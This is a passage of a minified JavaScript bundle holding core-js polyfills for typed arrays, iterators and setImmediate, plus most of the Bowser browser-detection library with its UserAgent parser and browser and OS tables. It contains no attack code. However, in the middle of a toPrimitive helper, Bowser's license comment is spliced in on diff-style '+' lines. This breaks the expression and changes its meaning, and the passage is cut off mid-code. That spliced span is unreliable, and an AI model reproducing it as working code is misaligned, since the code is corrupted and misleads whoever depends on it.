r,i=e(1),o=e(14),u=e(31),a=u("typed_array"),c=u("view"),s=!(!i.ArrayBuffer||!i.DataView),f=s,l=0,h="Int8Array,Uint8Array,Uint8ClampedArray,Int16Array,Uint16Array,Int32Array,Uint32Array,Float32Array,Float64Array".split(",");l<9;)(r=i[h[l++]])?(o(r.prototype,a,!0),o(r.prototype,c,!0)):f=!1;t.exports={ABV:s,CONSTR:f,TYPED:a,VIEW:c}},function(t,n,e){var r=e(4),i=e(1).document,o=r(i)&&r(i.createElement);t.exports=function(t){return o?i.createElement(t):{}}},function(t,n,e){n.f=e(5)},function(t,n,e){var r=e(50)("keys"),i=e(31);t.exports=function(t){return r[t]||(r[t]=i(t))}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n,e){var r=e(1).document;t.exports=r&&r.documentElement},function(t,n,e){var r=e(4),i=e(3),o=function(t,n){if(i(t),!r(n)&&null!==n)throw TypeError(n+": can't set as prototype!")};t.exports={set:Object.setPrototypeOf||("__proto__"in{}?function(t,n,r){try{(r=e(19)(Function.call,e(22).f(Object.prototype,"__proto__").set,2))(t,[]),n=!(t instanceof Array)}catch(t){n=!0}return function(t,e){return o(t,e),n?t.__proto__=e:r(t,e),t}}({},!1):void 0),check:o}},function(t,n){t.exports="\t\n\v\f\r   ᠎             　\u2028\u2029\ufeff"},function(t,n,e){var r=e(4),i=e(67).set;t.exports=function(t,n,e){var o,u=n.constructor;return u!==e&&"function"==typeof u&&(o=u.prototype)!==e.prototype&&r(o)&&i&&i(t,o),t}},function(t,n,e){"use strict";var r=e(21),i=e(26);t.exports=function(t){var n=String(i(this)),e="",o=r(t);if(o<0||o==1/0)throw RangeError("Count can't be negative");for(;o>0;(o>>>=1)&&(n+=n))1&o&&(e+=n);return e}},function(t,n){t.exports=Math.sign||function(t){return 0==(t=+t)||t!=t?t:t<0?-1:1}},function(t,n){var e=Math.expm1;t.exports=!e||e(10)>22025.465794806718||e(10)<22025.465794806718||-2e-17!=e(-2e-17)?function(t){return 0==(t=+t)?t:t>-1e-6&&t<1e-6?t+t*t/2:Math.exp(t)-1}:e},function(t,n,e){var r=e(21),i=e(26);t.exports=function(t){return function(n,e){var o,u,a=String(i(n)),c=r(e),s=a.length;return c<0||c>=s?t?"":void 0:(o=a.charCodeAt(c))<55296||o>56319||c+1===s||(u=a.charCodeAt(c+1))<56320||u>57343?t?a.charAt(c):o:t?a.slice(c,c+2):u-56320+(o-55296<<10)+65536}}},function(t,n,e){"use strict";var r=e(32),i=e(0),o=e(11),u=e(14),a=e(42),c=e(110),s=e(40),f=e(37),l=e(5)("iterator"),h=!([].keys&&"next"in[].keys()),d=function(){return this};t.exports=function(t,n,e,p,v,g,y){c(e,n,p);var m,b,S,w=function(t){if(!h&&t in P)return P[t];switch(t){case"keys":case"values":return function(){return new e(this,t)}}return function(){return new e(this,t)}},M=n+" Iterator",_="values"==v,x=!1,P=t.prototype,O=P[l]||P["@@iterator"]||v&&P[v],A=O||w(v),F=v?_?w("entries"):A:void 0,E="Array"==n&&P.entries||O;if(E&&(S=f(E.call(new t)))!==Object.prototype&&S.next&&(s(S,M,!0),r||"function"==typeof S[l]||u(S,l,d)),_&&O&&"values"!==O.name&&(x=!0,A=function(){return O.call(this)}),r&&!y||!h&&!x&&P[l]||u(P,l,A),a[n]=A,a[M]=d,v)if(m={values:_?A:w("values"),keys:g?A:w("keys"),entries:F},y)for(b in m)b in P||o(P,b,m[b]);else i(i.P+i.F*(h||x),n,m);return m}},function(t,n,e){var r=e(76),i=e(26);t.exports=function(t,n,e){if(r(n))throw TypeError("String#"+e+" doesn't accept regex!");return String(i(t))}},function(t,n,e){var r=e(4),i=e(25),o=e(5)("match");t.exports=function(t){var n;return r(t)&&(void 0!==(n=t[o])?!!n:"RegExp"==i(t))}},function(t,n,e){var r=e(5)("match");t.exports=function(t){var n=/./;try{"/./"[t](n)}catch(e){try{return n[r]=!1,!"/./"[t](n)}catch(t){}}return!0}},function(t,n,e){var r=e(42),i=e(5)("iterator"),o=Array.prototype;t.exports=function(t){return void 0!==t&&(r.Array===t||o[i]===t)}},function(t,n,e){"use strict";var r=e(9),i=e(30);t.exports=function(t,n,e){n in t?r.f(t,n,i(0,e)):t[n]=e}},function(t,n,e){var r=e(48),i=e(5)("iterator"),o=e(42);t.exports=e(7).getIteratorMethod=function(t){if(null!=t)return t[i]||t["@@iterator"]||o[r(t)]}},function(t,n,e){"use strict";var r=e(10),i=e(34),o=e(6);t.exports=function(t){for(var n=r(this),e=o(n.length),u=arguments.length,a=i(u>1?arguments[1]:void 0,e),c=u>2?arguments[2]:void 0,s=void 0===c?e:i(c,e);s>a;)n[a++]=t;return n}},function(t,n,e){"use strict";var r=e(38),i=e(115),o=e(42),u=e(15);t.exports=e(74)(Array,"Array",(function(t,n){this._t=u(t),this._i=0,this._k=n}),(function(){var t=this._t,n=this._k,e=this._i++;return!t||e>=t.length?(this._t=void 0,i(1)):i(0,"keys"==n?e:"values"==n?t[e]:[e,t[e]])}),"values"),o.Arguments=o.Array,r("keys"),r("values"),r("entries")},function(t,n,e){"use strict";var r,i,o=e(55),u=RegExp.prototype.exec,a=String.prototype.replace,c=u,s=(r=/a/,i=/b*/g,u.call(r,"a"),u.call(i,"a"),0!==r.lastIndex||0!==i.lastIndex),f=void 0!==/()??/.exec("")[1];(s||f)&&(c=function(t){var n,e,r,i,c=this;return f&&(e=new RegExp("^"+c.source+"$(?!\\s)",o.call(c))),s&&(n=c.lastIndex),r=u.call(c,t),s&&r&&(c.lastIndex=c.global?r.index+r[0].length:n),f&&r&&r.length>1&&a.call(r[0],e,(function(){for(i=1;i<arguments.length-2;i++)void 0===arguments[i]&&(r[i]=void 0)})),r}),t.exports=c},function(t,n,e){"use strict";var r=e(73)(!0);t.exports=function(t,n,e){return n+(e?r(t,n).length:1)}},function(t,n,e){var r,i,o,u=e(19),a=e(104),c=e(66),s=e(62),f=e(1),l=f.process,h=f.setImmediate,d=f.clearImmediate,p=f.MessageChannel,v=f.Dispatch,g=0,y={},m=function(){var t=+this;if(y.hasOwnProperty(t)){var n=y[t];delete y[t],n()}},b=function(t){m.call(t.data)};h&&d||(h=function(t){for(var n=[],e=1;arguments.length>e;)n.push(arguments[e++]);return y[++g]=function(){a("function"==typeof t?t:Function(t),n)},r(g),g},d=function(t){delete y[t]},"process"==e(25)(l)?r=function(t){l.nextTick(u(m,t,1))}:v&&v.now?r=function(t){v.now(u(m,t,1))}:p?(o=(i=new p).port2,i.port1.onmessage=b,r=u(o.postMessage,o,1)):f.addEventListener&&"function"==typeof postMessage&&!f.importScripts?(r=function(t){f.postMessage(t+"","*")},f.addEventListener("message",b,!1)):r="onreadystatechange"in s("script")?function(t){c.appendChild(s("script")).onreadystatechange=function(){c.removeChild(this),m.call(t)}}:function(t){setTimeout(u(m,t,1),0)}),t.exports={set:h,clear:d}},function(t,n,e){"use strict";var r=e(1),i=e(8),o=e(32),u=e(61),a=e(14),c=e(45),s=e(2),f=e(44),l=e(21),h=e(6),d=e(123),p=e(36).f,v=e(9).f,g=e(81),y=e(40),m=r.ArrayBuffer,b=r.DataView,S=r.Math,w=r.RangeError,M=r.Infinity,_=m,x=S.abs,P=S.pow,O=S.floor,A=S.log,F=S.LN2,E=i?"_b":"buffer",N=i?"_l":"byteLength",R=i?"_o":"byteOffset";function T(t,n,e){var r,i,o,u=new Array(e),a=8*e-n-1,c=(1<<a)-1,s=c>>1,f=23===n?P(2,-24)-P(2,-77):0,l=0,h=t<0||0===t&&1/t<0?1:0;for((t=x(t))!=t||t===M?(i=t!=t?1:0,r=c):(r=O(A(t)/F),t*(o=P(2,-r))<1&&(r--,o*=2),(t+=r+s>=1?f/o:f*P(2,1-s))*o>=2&&(r++,o/=2),r+s>=c?(i=0,r=c):r+s>=1?(i=(t*o-1)*P(2,n),r+=s):(i=t*P(2,s-1)*P(2,n),r=0));n>=8;u[l++]=255&i,i/=256,n-=8);for(r=r<<n|i,a+=n;a>0;u[l++]=255&r,r/=256,a-=8);return u[--l]|=128*h,u}function k(t,n,e){var r,i=8*e-n-1,o=(1<<i)-1,u=o>>1,a=i-7,c=e-1,s=t[c--],f=127&s;for(s>>=7;a>0;f=256*f+t[c],c--,a-=8);for(r=f&(1<<-a)-1,f>>=-a,a+=n;a>0;r=256*r+t[c],c--,a-=8);if(0===f)f=1-u;else{if(f===o)return r?NaN:s?-M:M;r+=P(2,n),f-=u}return(s?-1:1)*r*P(2,f-n)}function j(t){return t[3]<<24|t[2]<<16|t[1]<<8|t[0]}function I(t){return[255&t]}function L(t){return[255&t,t>>8&255]}function B(t){return[255&t,t>>8&255,t>>16&255,t>>24&255]}function C(t){return T(t,52,8)}function W(t){return T(t,23,4)}function V(t,n,e){v(t.prototype,n,{get:function(){return this[e]}})}function G(t,n,e,r){var i=d(+e);if(i+n>t[N])throw w("Wrong index!");var o=t[E]._b,u=i+t[R],a=o.slice(u,u+n);return r?a:a.reverse()}function D(t,n,e,r,i,o){var u=d(+e);if(u+n>t[N])throw w("Wrong index!");for(var a=t[E]._b,c=u+t[R],s=r(+i),f=0;f<n;f++)a[c+f]=s[o?f:n-f-1]}if(u.ABV){if(!s((function(){m(1)}))||!s((function(){new m(-1)}))||s((function(){return new m,new m(1.5),new m(NaN),"ArrayBuffer"!=m.name}))){for(var U,z=(m=function(t){return f(this,m),new _(d(t))}).prototype=_.prototype,q=p(_),K=0;q.length>K;)(U=q[K++])in m||a(m,U,_[U]);o||(z.constructor=m)}var Y=new b(new m(2)),Q=b.prototype.setInt8;Y.setInt8(0,2147483648),Y.setInt8(1,2147483649),!Y.getInt8(0)&&Y.getInt8(1)||c(b.prototype,{setInt8:function(t,n){Q.call(this,t,n<<24>>24)},setUint8:function(t,n){Q.call(this,t,n<<24>>24)}},!0)}else m=function(t){f(this,m,"ArrayBuffer");var n=d(t);this._b=g.call(new Array(n),0),this[N]=n},b=function(t,n,e){f(this,b,"DataView"),f(t,m,"DataView");var r=t[N],i=l(n);if(i<0||i>r)throw w("Wrong offset!");if(i+(e=void 0===e?r-i:h(e))>r)throw w("Wrong length!");this[E]=t,this[R]=i,this[N]=e},i&&(V(m,"byteLength","_l"),V(b,"buffer","_b"),V(b,"byteLength","_l"),V(b,"byteOffset","_o")),c(b.prototype,{getInt8:function(t){return G(this,1,t)[0]<<24>>24},getUint8:function(t){return G(this,1,t)[0]},getInt16:function(t){var n=G(this,2,t,arguments[1]);return(n[1]<<8|n[0])<<16>>16},getUint16:function(t){var n=G(this,2,t,arguments[1]);return n[1]<<8|n[0]},getInt32:function(t){return j(G(this,4,t,arguments[1]))},getUint32:function(t){return j(G(this,4,t,arguments[1]))>>>0},getFloat32:function(t){return k(G(this,4,t,arguments[1]),23,4)},getFloat64:function(t){return k(G(this,8,t,arguments[1]),52,8)},setInt8:function(t,n){D(this,1,t,I,n)},setUint8:function(t,n){D(this,1,t,I,n)},setInt16:function(t,n){D(this,2,t,L,n,arguments[2])},setUint16:function(t,n){D(this,2,t,L,n,arguments[2])},setInt32:function(t,n){D(this,4,t,B,n,arguments[2])},setUint32:function(t,n){D(this,4,t,B,n,arguments[2])},setFloat32:function(t,n){D(this,4,t,W,n,arguments[2])},setFloat64:function(t,n){D(this,8,t,C,n,arguments[2])}});y(m,"ArrayBuffer"),y(b,"DataView"),a(b.prototype,u.VIEW,!0),n.ArrayBuffer=m,n.DataView=b},function(t,n){var e=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=e)},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n,e){t.exports=!e(128)((function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a}))},function(t,n,e){"use strict";n.__esModule=!0,n.default=void 0;var r,i=(r=e(91))&&r.__esModule?r:{default:r},o=e(18);function u(t,n){for(var e=0;e<n.length;e++){var r=n[e];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(t,a(r.key),r)}}function a(t){var n=function(t,n){if("object"!=typeof t||!t)return t;var e=t[Symbol.toPrimitive];if(void 0!==e){var r=e.call(t,n||"default");if("object"!=typeof r)return r;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===n?String:Number)(t)}
+/*!
+ * Bowser - a browser detector
+ * https://github.com/lancedikson/bowser
+ * MIT License | (c) Dustin Diaz 2012-2015
+ * MIT License | (c) Denis Demchenko 2015-2019
+ */(t,"string");return"symbol"==typeof n?n:n+""}var c=function(){function t(){}return t.getParser=function(t,n){if(void 0===n&&(n=!1),"string"!=typeof t)throw new Error("UserAgent should be a string");return new i.default(t,n)},t.parse=function(t){return new i.default(t).getResult()},function(t,n,e){return n&&u(t.prototype,n),e&&u(t,e),Object.defineProperty(t,"prototype",{writable:!1}),t}(t,null,[{key:"BROWSER_MAP",get:function(){return o.BROWSER_MAP}},{key:"ENGINE_MAP",get:function(){return o.ENGINE_MAP}},{key:"OS_MAP",get:function(){return o.OS_MAP}},{key:"PLATFORMS_MAP",get:function(){return o.PLATFORMS_MAP}}])}();n.default=c;t.exports=n.default},function(t,n,e){"use strict";n.__esModule=!0,n.default=void 0;var r=c(e(92)),i=c(e(93)),o=c(e(94)),u=c(e(95)),a=c(e(17));function c(t){return t&&t.__esModule?t:{default:t}}var s=function(){function t(t,n){if(void 0===n&&(n=!1),null==t||""===t)throw new Error("UserAgent parameter can't be empty");this._ua=t,this.parsedResult={},!0!==n&&this.parse()}var n=t.prototype;return n.getUA=function(){return this._ua},n.test=function(t){return t.test(this._ua)},n.parseBrowser=function(){var t=this;this.parsedResult.browser={};var n=a.default.find(r.default,(function(n){if("function"==typeof n.test)return n.test(t);if(Array.isArray(n.test))return n.test.some((function(n){return t.test(n)}));throw new Error("Browser's test function is not valid")}));return n&&(this.parsedResult.browser=n.describe(this.getUA())),this.parsedResult.browser},n.getBrowser=function(){return this.parsedResult.browser?this.parsedResult.browser:this.parseBrowser()},n.getBrowserName=function(t){return t?String(this.getBrowser().name).toLowerCase()||"":this.getBrowser().name||""},n.getBrowserVersion=function(){return this.getBrowser().version},n.getOS=function(){return this.parsedResult.os?this.parsedResult.os:this.parseOS()},n.parseOS=function(){var t=this;this.parsedResult.os={};var n=a.default.find(i.default,(function(n){if("function"==typeof n.test)return n.test(t);if(Array.isArray(n.test))return n.test.some((function(n){return t.test(n)}));throw new Error("Browser's test function is not valid")}));return n&&(this.parsedResult.os=n.describe(this.getUA())),this.parsedResult.os},n.getOSName=function(t){var n=this.getOS().name;return t?String(n).toLowerCase()||"":n||""},n.getOSVersion=function(){return this.getOS().version},n.getPlatform=function(){return this.parsedResult.platform?this.parsedResult.platform:this.parsePlatform()},n.getPlatformType=function(t){void 0===t&&(t=!1);var n=this.getPlatform().type;return t?String(n).toLowerCase()||"":n||""},n.parsePlatform=function(){var t=this;this.parsedResult.platform={};var n=a.default.find(o.default,(function(n){if("function"==typeof n.test)return n.test(t);if(Array.isArray(n.test))return n.test.some((function(n){return t.test(n)}));throw new Error("Browser's test function is not valid")}));return n&&(this.parsedResult.platform=n.describe(this.getUA())),this.parsedResult.platform},n.getEngine=function(){return this.parsedResult.engine?this.parsedResult.engine:this.parseEngine()},n.getEngineName=function(t){return t?String(this.getEngine().name).toLowerCase()||"":this.getEngine().name||""},n.parseEngine=function(){var t=this;this.parsedResult.engine={};var n=a.default.find(u.default,(function(n){if("function"==typeof n.test)return n.test(t);if(Array.isArray(n.test))return n.test.some((function(n){return t.test(n)}));throw new Error("Browser's test function is not valid")}));return n&&(this.parsedResult.engine=n.describe(this.getUA())),this.parsedResult.engine},n.parse=function(){return this.parseBrowser(),this.parseOS(),this.parsePlatform(),this.parseEngine(),this},n.getResult=function(){return a.default.assign({},this.parsedResult)},n.satisfies=function(t){var n=this,e={},r=0,i={},o=0;if(Object.keys(t).forEach((function(n){var u=t[n];"string"==typeof u?(i[n]=u,o+=1):"object"==typeof u&&(e[n]=u,r+=1)})),r>0){var u=Object.keys(e),c=a.default.find(u,(function(t){return n.isOS(t)}));if(c){var s=this.satisfies(e[c]);if(void 0!==s)return s}var f=a.default.find(u,(function(t){return n.isPlatform(t)}));if(f){var l=this.satisfies(e[f]);if(void 0!==l)return l}}if(o>0){var h=Object.keys(i),d=a.default.find(h,(function(t){return n.isBrowser(t,!0)}));if(void 0!==d)return this.compareVersion(i[d])}},n.isBrowser=function(t,n){void 0===n&&(n=!1);var e=this.getBrowserName().toLowerCase(),r=t.toLowerCase(),i=a.default.getBrowserTypeByAlias(r);return n&&i&&(r=i.toLowerCase()),r===e},n.compareVersion=function(t){var n=[0],e=t,r=!1,i=this.getBrowserVersion();if("string"==typeof i)return">"===t[0]||"<"===t[0]?(e=t.substr(1),"="===t[1]?(r=!0,e=t.substr(2)):n=[],">"===t[0]?n.push(1):n.push(-1)):"="===t[0]?e=t.substr(1):"~"===t[0]&&(r=!0,e=t.substr(1)),n.indexOf(a.default.compareVersions(i,e,r))>-1},n.isOS=function(t){return this.getOSName(!0)===String(t).toLowerCase()},n.isPlatform=function(t){return this.getPlatformType(!0)===String(t).toLowerCase()},n.isEngine=function(t){return this.getEngineName(!0)===String(t).toLowerCase()},n.is=function(t,n){return void 0===n&&(n=!1),this.isBrowser(t,n)||this.isOS(t)||this.isPlatform(t)},n.some=function(t){var n=this;return void 0===t&&(t=[]),t.some((function(t){return n.is(t)}))},t}();n.default=s;t.exports=n.default},function(t,n,e){"use strict";n.__esModule=!0,n.default=void 0;var r,i=(r=e(17))&&r.__esModule?r:{default:r};var o=/version\/(\d+(\.?_?\d+)+)/i,u=[{test:[/googlebot/i],describe:function(t){var n={name:"Googlebot"},e=i.default.getFirstMatch(/googlebot\/(\d+(\.\d+))/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/opera/i],describe:function(t){var n={name:"Opera"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:opera)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/opr\/|opios/i],describe:function(t){var n={name:"Opera"},e=i.default.getFirstMatch(/(?:opr|opios)[\s/](\S+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/SamsungBrowser/i],describe:function(t){var n={name:"Samsung Internet for Android"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:SamsungBrowser)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/Whale/i],describe:function(t){var n={name:"NAVER Whale Browser"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:whale)[\s/](\d+(?:\.\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/PaleMoon/i],describe:function(t){var n={name:"Pale Moon"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:PaleMoon)[\s/](\d+(?:\.\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/MZBrowser/i],describe:function(t){var n={name:"MZ Browser"},e=i.default.getFirstMatch(/(?:MZBrowser)[\s/](\d+(?:\.\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/focus/i],describe:function(t){var n={name:"Focus"},e=i.default.getFirstMatch(/(?:focus)[\s/](\d+(?:\.\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/swing/i],describe:function(t){var n={name:"Swing"},e=i.default.getFirstMatch(/(?:swing)[\s/](\d+(?:\.\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/coast/i],describe:function(t){var n={name:"Opera Coast"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:coast)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/opt\/\d+(?:.?_?\d+)+/i],describe:function(t){var n={name:"Opera Touch"},e=i.default.getFirstMatch(/(?:opt)[\s/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/yabrowser/i],describe:function(t){var n={name:"Yandex Browser"},e=i.default.getFirstMatch(/(?:yabrowser)[\s/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/ucbrowser/i],describe:function(t){var n={name:"UC Browser"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:ucbrowser)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/Maxthon|mxios/i],describe:function(t){var n={name:"Maxthon"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:Maxthon|mxios)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/epiphany/i],describe:function(t){var n={name:"Epiphany"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:epiphany)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/puffin/i],describe:function(t){var n={name:"Puffin"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:puffin)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/sleipnir/i],describe:function(t){var n={name:"Sleipnir"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:sleipnir)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/k-meleon/i],describe:function(t){var n={name:"K-Meleon"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/(?:k-meleon)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/micromessenger/i],describe:function(t){var n={name:"WeChat"},e=i.default.getFirstMatch(/(?:micromessenger)[\s/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/qqbrowser/i],describe:function(t){var n={name:/qqbrowserlite/i.test(t)?"QQ Browser Lite":"QQ Browser"},e=i.default.getFirstMatch(/(?:qqbrowserlite|qqbrowser)[/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/msie|trident/i],describe:function(t){var n={name:"Internet Explorer"},e=i.default.getFirstMatch(/(?:msie |rv:)(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/\sedg\//i],describe:function(t){var n={name:"Microsoft Edge"},e=i.default.getFirstMatch(/\sedg\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/edg([ea]|ios)/i],describe:function(t){var n={name:"Microsoft Edge"},e=i.default.getSecondMatch(/edg([ea]|ios)\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/vivaldi/i],describe:function(t){var n={name:"Vivaldi"},e=i.default.getFirstMatch(/vivaldi\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/seamonkey/i],describe:function(t){var n={name:"SeaMonkey"},e=i.default.getFirstMatch(/seamonkey\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/sailfish/i],describe:function(t){var n={name:"Sailfish"},e=i.default.getFirstMatch(/sailfish\s?browser\/(\d+(\.\d+)?)/i,t);return e&&(n.version=e),n}},{test:[/silk/i],describe:function(t){var n={name:"Amazon Silk"},e=i.default.getFirstMatch(/silk\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/phantom/i],describe:function(t){var n={name:"PhantomJS"},e=i.default.getFirstMatch(/phantomjs\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/slimerjs/i],describe:function(t){var n={name:"SlimerJS"},e=i.default.getFirstMatch(/slimerjs\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/blackberry|\bbb\d+/i,/rim\stablet/i],describe:function(t){var n={name:"BlackBerry"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/blackberry[\d]+\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/(web|hpw)[o0]s/i],describe:function(t){var n={name:"WebOS Browser"},e=i.default.getFirstMatch(o,t)||i.default.getFirstMatch(/w(?:eb)?[o0]sbrowser\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/bada/i],describe:function(t){var n={name:"Bada"},e=i.default.getFirstMatch(/dolfin\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/tizen/i],describe:function(t){var n={name:"Tizen"},e=i.default.getFirstMatch(/(?:tizen\s?)?browser\/(\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/qupzilla/i],describe:function(t){var n={name:"QupZilla"},e=i.default.getFirstMatch(/(?:qupzilla)[\s/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/firefox|iceweasel|fxios/i],describe:function(t){var n={name:"Firefox"},e=i.default.getFirstMatch(/(?:firefox|iceweasel|fxios)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/electron/i],describe:function(t){var n={name:"Electron"},e=i.default.getFirstMatch(/(?:electron)\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/MiuiBrowser/i],describe:function(t){var n={name:"Miui"},e=i.default.getFirstMatch(/(?:MiuiBrowser)[\s/](\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/chromium/i],describe:function(t){var n={name:"Chromium"},e=i.default.getFirstMatch(/(?:chromium)[\s/](\d+(\.?_?\d+)+)/i,t)||i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/chrome|crios|crmo/i],describe:function(t){var n={name:"Chrome"},e=i.default.getFirstMatch(/(?:chrome|crios|crmo)\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:[/GSA/i],describe:function(t){var n={name:"Google Search"},e=i.default.getFirstMatch(/(?:GSA)\/(\d+(\.?_?\d+)+)/i,t);return e&&(n.version=e),n}},{test:function(t){var n=!t.test(/like android/i),e=t.test(/android/i);return n&&e},describe:function(t){var n={name:"Android Browser"},e=i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/playstation 4/i],describe:function(t){var n={name:"PlayStation 4"},e=i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/safari|applewebkit/i],describe:function(t){var n={name:"Safari"},e=i.default.getFirstMatch(o,t);return e&&(n.version=e),n}},{test:[/.*/i],describe:function(t){var n=-1!==t.search("\\(")?/^(.*)\/(.*)[ \t]\((.*)/:/^(.*)\/(.*) /;return{name:i.default.getFirstMatch(n,t),version:i.default.getSecondMatch(n,t)}}}];n.default=u;t.exports=n.default},function(t,n,e){"use strict";n.__esModule=!0,n.default=void 0;var r,i=(r=e(17))&&r.__esModule?r:{default:r},o=e(18);n.default=[{test:[/Roku\/DVP/],describe:function(t){var n=i.default.getFirstMatch(/Roku\/DVP-(\d+\.\d+)/i,t);return{name:o.OS_MAP.Roku,version:n}}},{test:[/windows phone/i],describe:function(t){var n=i.default.getFirstMatch(/windows phone (?:os)?\s?(\d+(\.\d+)*)/i,t);return{name:o.OS_MAP.WindowsPhone,version:n}}},{test:[/windows /i],describe:function(t){var n=i.default.getFirstMatch(/Windows ((NT|XP)( \d\d?.\d)?)/i,t),e=i.default.getWindowsVersionName(n);return{name:o.OS_MAP.Windows,version:n,versionName:e}}},{test:[/Macintosh(.*?) FxiOS(.*?)\//],describe:function(t){var n={name:o.OS_MAP.iOS},e=i.default.getSecondMatch(/(Version\/)(\d[\d.]+)/,t);return e&&(n.version=e),n}},{test:[/macintosh/i],describe:function(t){var n=i.default.getFirstMatch(/mac os x (\d+(\.?_?\d+)+)/i,t).replace(/[_\s]/g,"."),e=i.default.getMacOSVersionName(n),r={name:o.OS_MAP.MacOS,version:n};return e&&(r.versionName=e),r}},{test:[/(ipod|iphone|ipad)/i],describe:function(t){var n=i.default.getFirstMatch(/os (\d+([_\s]\d+)*) like mac os x/i,t).replace(/[_\s]/g,".");return{name:o.OS_MAP.iOS,version:n}}},{test:function(t){var n=!t.test(/like android/i),e=t.test(/android/i);return n&&e},describe:function(t){var n=i.default.getFirstMatch(/android[\s/-](\d+(\.\d+)*)/i,t),e=i.default.getAndroidVersionName(n),r={name:o.OS_MAP.Android,version:n};return e&&(r.versionName=e),r}},{test:[/(web|hpw)[o0]s/i],describe:function(t){var n=i.default.getFirstMatch(/(?:web|hpw)[o0]s\/(\d+(\.\d+)*)/i,t),e={name:o.OS_MAP.WebOS};return n&&n.length&&(e.version=n),e}},{test:[/blackberry|\bbb\d+/i,/rim\stablet/i],describe:function(t){var n=i.default.getFirstMatch(/rim\stablet\sos\s(\d+(\.\d+)*)/i,t)||i.default.getFirstMatch(/blackberry\d+\/(\d+([_\s]\d+)*)/i,t)||i.default.getFirstMatch(/\bbb(\d+)/i,t);return{name:o.OS_MAP.BlackBerry,version:n}}},{test:[/bada/i],describe:function(t){var n=i.default.getFirstMatch(/bada\/(\d+(\.\d+)*)/i,t);return{name:o.OS_MAP.Bada,version:n}}},{test:[/tizen/i],describe:function(t){var n=i.default.getFirstMatch(/tizen[/\s](\d+(\.\d+)*)/i,t);return{name:o.OS_MAP.Tizen,version:n}}},{test:[/linux/i],describe:function(){return{name:o.OS_MAP.Linux}}},{test:[/CrOS/],describe:function(){return{name:o.OS_MAP.ChromeOS}}},{test:[/PlayStation 4/],describe:function(t){var n=i.default.getFirstMatch(/PlayStation 